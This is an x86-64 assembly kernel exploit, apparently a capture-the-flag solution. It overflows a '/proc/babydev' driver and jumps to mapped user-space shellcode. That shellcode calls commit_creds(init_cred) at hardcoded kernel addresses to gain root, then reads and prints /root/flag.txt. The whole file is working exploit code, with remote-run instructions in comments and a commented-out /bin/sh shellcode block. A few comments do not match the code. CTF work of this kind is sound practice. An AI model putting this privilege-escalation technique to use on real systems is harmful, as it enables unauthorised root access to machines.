SECTION .DATA
 
  ; Instructions: 
  ; - compile on host as:
  ;   $ nasm -f elf64 hello.asm -o hello.o  && ld hello.o -o hello && base64 hello > oook && cat oook | xclip -selection clipboard
  ;
  ; - then in remote use:
  ;   $ base64 -d file_encode > out && chmod +x out && ./out
  ;

  Hello: db "Test Hi", 0xa

  ; files, dev, ..
	babydev:     db '/proc/babydev',0
  flags:       db '/root/flag.txt', 0
  File_Mode: dq 754
  hello: db 'Hello world', 0xa, 0

  ; utils
  mmap_prot: dq 0x7
  mmap_flags: dq 0x32
  mmap_fd: dq -1
  mmap_offset: dq 0
  init_cred: dq 0xffffffff81839520
  commit_creds: dq 0xffffffff81052830
  return_point: dq 0xffffffff810fdc48

  ; this payload will be the exploit buffer
  payload1: db '1 '
  payload2: times 100-2 db 'A'
  m: dq 1
  c: dq 2
  num: dq 3
  overflow: dq 0x100000

  ; this buffer will contain the flag
  buff: times 100 db 'X'


;  struct trapframe {
;    uint32_t   sp_usr;     // user mode sp
;    uint32_t   lr_usr;     // user mode lr
;    uint32_t   sp_svc;
;    uint32_t   lr_svc;
;    uint32_t   spsr;
;    uint32_t   r[N_GEN_REGS];
;    uint32_t   pc;         // (lr on entry) instruction to resume execution
;};
  trapframe: 
    dq 0,     ; user_rdi
    dq 0,     ; orig_eax
    dq shell  ; ret user
  ucs : 
    dq 0
  urflags: 
    dq 0
  ursp:
    dq 0
  uss: 
    dq 0 


; Code goes in the text section
SECTION .TEXT
	GLOBAL _start 

_start:
 ; USER-MODE code
 ; make rwx
 ; call print_test 
 mov rax, 10
 mov rdi, 0x400000
 mov rsi, 0x2000
 mov rdx, 0x7
 syscall

 ; save state  ; Useless ignore..
 mov [ucs], cs
 mov [uss], ss
 mov [ursp], rsp
 pushf
 pop rax
 mov [urflags], rax

 ; mmap our return point because there's no smep  
 ; call mmap(0x100000, 0x1000, 7, 0, 0, 0)
 push 0x32
 pop r10
 push -1
 pop r8
 xor r9d, r9d   ; 0 */
 push 9         ; 9 */
 pop rax
 mov rdi, 0x100000
 push 7
 pop rdx
 mov esi, 0x1010101 ; 4096 == 0x1000 */
 xor esi, 0x1011101
 syscall

 ; load kernel-mode shellcode in 0x10000
 mov rsi, shellcode
 mov rdi, 0x100000
 push 0x88
 pop rcx
 rep movsb

 ; open babydev 
 mov rax, 0x2
 mov rdi, babydev
 mov rsi, 2 ; read-write
 mov rdx, File_Mode
 syscall

 ; store and overflow babydev
 mov rdi, rax
 mov rax, 0x1
 mov rsi, payload1
 mov rdx, 0x7c + 0x8
 syscall
  
 ; Never return from here.
 ; Terminate program
 mov rax,60            ;  'exit' system call
 mov rbx,0             ;  exit with error code 0
 syscall               ;  call the kernel


; ignore
;shell:
;  xor     rdx, rdx
;  mov     qword rbx, '//bin/sh'
;  shr     rbx, 0x8
;  push    rbx
;  mov     rdi, rsp
;  push    rax
;  push    rdi
;  mov     rsi, rsp
;  mov     al, 0x3b
;  syscall


; Kernel-mode shellcode
shellcode:

  ; get token
  ; lea rbp, [rsp + 0x10]  ; CARE HERE  ..... restore old value rbp
  lea rbp, [rsp + 0x10]
  mov rdi, 0xffffffff81839520 ; init_cred
  mov rax, 0xffffffff81052830 ; commit_creds
  call rax

  ; fd_ret = open("/root/flags.txt")
  mov rax, 2
  mov rdi, flags
  xor rsi, rsi
  xor rdx, rdx
  syscall

  ; read(fd_ret, buff, 0x42)
  mov rdi, rax
  xor rax, rax
  mov rsi, buff
  mov rdx, 0x42
  syscall

  ; write(1, buff, 0x42)
  mov rax, 1
  xor rdi, rdi
  inc rdi
  mov rsi, buff
  mov rdx, 0x42
  syscall

  ; done
	mov rax,60            ;  'exit' system call
	mov rbx,0             ;  exit with error code 0
	syscall               ;  call the kernel

  ; flag: ptm{y0ure_w3lc0m3_4_4ll_th15_k3rn3l_m3g4_fun}


print_test:
  push rbp
  mov rbp, rsp
  push rax
  push rdi
  push rsi
  push rdx

  mov rax, 1
  mov rdi, 1
  mov rsi, Hello
  mov rdx, 8
  syscall

  pop rdx
  pop rsi
  pop rdi
  pop rax
  mov rsp, rbp
  pop rbp
  ret


